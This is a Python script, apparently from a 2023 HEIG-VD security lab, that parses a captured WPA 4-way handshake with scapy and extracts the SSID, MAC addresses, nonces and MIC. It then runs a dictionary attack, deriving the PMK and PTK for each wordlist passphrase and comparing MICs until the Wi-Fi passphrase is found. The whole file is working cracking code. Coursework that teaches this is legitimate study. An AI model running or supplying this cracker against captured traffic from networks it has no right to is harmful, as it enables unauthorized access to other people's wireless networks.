#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Géraud Silvestri, Alexandre Jaquier, Francis Monti"
__copyright__   = "Copyright 2023, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
from tqdm.rich import tqdm

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap")

# Check for Association Request frame and start of handshake
association_request = ""
handshake_index = -1
for i, pckt in enumerate(wpa):
    if association_request == "" and pckt.haslayer(Dot11AssoReq):
        association_request = pckt
    if handshake_index == -1 and pckt.haslayer(EAPOL):
        handshake_index = i
    if handshake_index != -1 and association_request != "":
        break

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid = association_request.info.decode("utf-8")
APmac = a2b_hex(wpa[handshake_index].addr2.replace(":",""))
Clientmac = a2b_hex(wpa[handshake_index].addr1.replace(":","")) 

# Authenticator and Supplicant Nonces
ANonce = a2b_hex(wpa[handshake_index].load[13:45].hex())
SNonce = a2b_hex(wpa[handshake_index + 1].load[13:45].hex()) #Client Nonce

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = wpa[handshake_index + 3].original[-18:-2].hex() # We retrieve the MIC from the 4th frame of the 4-way handshake

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = wpa[handshake_index + 3].original[48:-18] + b'\0' * 16 + wpa[handshake_index + 3].original[-2:] # We retrieve the data from the payload of the 4th frame of the 4-way handshake without the MIC

### Open wordlist -> for each passphrase, calculate the pmk and then the MIC using the pseudo-random function

print ("Reading wordlist...")
ssid = str.encode(ssid)
num_lines = sum(1 for line in open('wordlist.txt'))

with open("wordlist.txt", "r") as wordlist:
  print ("Cracking passphrase...")
  for passPhrase in tqdm(wordlist, total=num_lines):
    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(passPhrase).strip()
    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:32]

    if mic == mic_to_test:
      print ("Passphrase found:", passPhrase.decode("utf-8"))
      break
  else:
    print ("Passphrase not found in wordlist")
  wordlist.close()
